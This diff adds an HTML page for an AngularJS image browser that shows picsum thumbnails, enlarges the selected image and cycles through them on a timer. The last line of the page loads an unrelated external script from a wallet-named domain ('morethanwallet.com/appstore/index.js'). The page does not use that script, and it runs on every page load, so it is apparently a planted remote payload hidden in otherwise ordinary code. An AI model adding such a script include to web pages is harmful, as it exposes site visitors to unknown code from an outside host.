@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html ng-app="imageApp">
+<head>
+  <title>Image Browser</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+  <style>
+.thumbnail, .fullsize {
+  cursor: pointer;
+}
+
+.thumbnail {
+  width: 100px;
+  height: 100px;
+  margin: 5px;
+}
+.thumbnail.active {
+  border: 2px solid blue; /* Highlight the selected thumbnail */
+}
+
+.fullsize {
+  display: none;
+  margin: 0 auto; 
+}
+
+.fullsize.active {
+  display: block;
+}
+
+.container {
+  text-align: center;
+}
+
+.separator {
+  margin: 20px 0;
+  border-top: 10px solid #ccc;
+}
+  </style>
+</head>
+<body>
+
+<div class="container" ng-controller="ImageController as vm">
+  <div>
+    <img ng-repeat="image in vm.images" ng-src="{{image.thumbnail}}" ng-click="vm.showFullSize($index)" class="thumbnail" ng-class="{active: $index === vm.currentIndex}">
+  </div>
+  <div class="separator"></div> 
+  <div>
+    <img ng-repeat="image in vm.images" ng-src="{{image.fullsize}}" class="fullsize" ng-class="{active: $index === vm.currentIndex}">
+  </div>
+</div>
+
+<script>
+  var app = angular.module('imageApp', []);
+
+  app.controller('ImageController', function($interval) {
+    var vm = this;
+
+    vm.images = [
+      { thumbnail: 'https://picsum.photos/id/24/50/50', fullsize: 'https://picsum.photos/id/24/300/300' },
+      { thumbnail: 'https://picsum.photos/id/40/50/50', fullsize: 'https://picsum.photos/id/40/300/300' },
+      { thumbnail: 'https://picsum.photos/id/43/50/50', fullsize: 'https://picsum.photos/id/43/300/300' },
+      { thumbnail: 'https://picsum.photos/id/77/50/50', fullsize: 'https://picsum.photos/id/77/300/300' },
+      { thumbnail: 'https://picsum.photos/id/96/50/50', fullsize: 'https://picsum.photos/id/96/300/300' },
+      { thumbnail: 'https://picsum.photos/id/103/50/50', fullsize: 'https://picsum.photos/id/103/300/300' },
+      { thumbnail: 'https://picsum.photos/id/111/50/50', fullsize: 'https://picsum.photos/id/111/300/300' },
+      { thumbnail: 'https://picsum.photos/id/112/50/50', fullsize: 'https://picsum.photos/id/112/300/300' },
+      { thumbnail: 'https://picsum.photos/id/119/50/50', fullsize: 'https://picsum.photos/id/119/300/300' },
+
+    ];
+
+    vm.currentIndex = null;
+
+    vm.showFullSize = function(index) {
+      vm.currentIndex = index;
+    };
+
+    var intervalPromise = $interval(function() {
+      vm.currentIndex = (vm.currentIndex + 1) % vm.images.length;
+    }, 2000);
+
+    // Clean up the interval when the controller is destroyed
+    vm.$onDestroy = function() {
+      $interval.cancel(intervalPromise);
+    };
+  });
+</script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
